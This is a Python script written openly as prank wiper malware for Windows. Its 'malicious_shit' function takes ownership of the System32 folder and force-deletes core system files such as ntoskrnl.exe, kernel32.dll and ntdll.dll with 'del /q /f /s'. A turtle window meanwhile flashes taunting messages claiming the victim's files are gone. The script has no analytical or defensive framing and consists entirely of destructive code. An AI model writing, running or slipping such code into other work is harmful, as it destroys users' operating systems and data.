import subprocess
import time
from turtle import *
import turtle
system32 = r"C:/Windows/System32"
def malicious_shit():
    subprocess.run(["takeown", "/f", system32],shell=True)
    kern32="C:\\Windows\\System32\\ntoskrnl.exe"
    kernel="C:\\Windows\\System32\\kernel32.dll"
    user="C:\\Windows\\System32\\user32.dll"
    gdi="C:\\Windows\\System32\\gdi32.dll"
    advapi="C:\\Windows\\System32\\advapi32.dll"
    kerneldll="C:\\Windows\\System32\\ntdll.dll"
    shell="C:\\Windows\\System32\\shell32.dll"
    ole="C:\\Windows\\System32\\ole32.dll"
    oleaut="C:\\Windows\\System32\\oleaut32.dll"
    comdlg="C:\\Windows\\System32\\comdlg32.dll"
    msvcrt="C:\\Windows\\System32\\msvcrt.dll"
    try :
         subprocess.run(["del","/q"," /f"," /s ",kern32], shell=True)
         subprocess.run(["del"," /q"," /f"," /s ",kernel],shell=True)
         subprocess.run(["del"," /q" ,"/f","/s ",kerneldll],shell=True)
         subprocess.run(["del"," /q"," /f"," /s ",user],shell=True)
         subprocess.run(["del ","/q ","/f ","/s ",gdi],shell=True)
         subprocess.run(["del"," /q ","/f" ,"/s ",advapi],shell=True)
         subprocess.run(["del"," /q", "/f ","/s ",shell],shell=True)
         subprocess.run(["del"," /q" ,"/f"," /s ",ole],shell=True)
         subprocess.run(["del", "/q"," /f"," /s ",oleaut],shell=True)
         subprocess.run(["del" , "/q", "/f", "/s",comdlg],shell=True)
         subprocess.run(["del", "/q", "/f", "/s",msvcrt],shell=True)
    except OSError :
         print("Check your permissions stupid")
         input("Press any key to exit")
         exit(0)
    except KeyboardInterrupt:
         print("Coward 🤣🫵")
         input("Press any key to exit")
         exit(0)
def graphics():
        screen = turtle.Screen()
        screen.bgcolor("black")
        screen.title("UH OH UR FILES ARE GONIE GONE :)")
        screen.setup(width=800, height=600)
    
        writer = turtle.Turtle()
        writer.hideturtle()
        writer.speed(0)
        writer.penup()
        writer.goto(0, 0)  

        colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

        def flash_text():
            # Rotate colors
            current_color = colors.pop(0)
            colors.append(current_color)
        
        
            writer.clear()
            writer.color(current_color)
            writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", 
                    align="center", 
                    font=("Comic Sans MS", 32, "bold"))
        
        
            screen.ontimer(flash_text, 500)

    
        flash_text()
        screen.mainloop()
        turtle.done
while True:
        graphics()
malicious_shit()
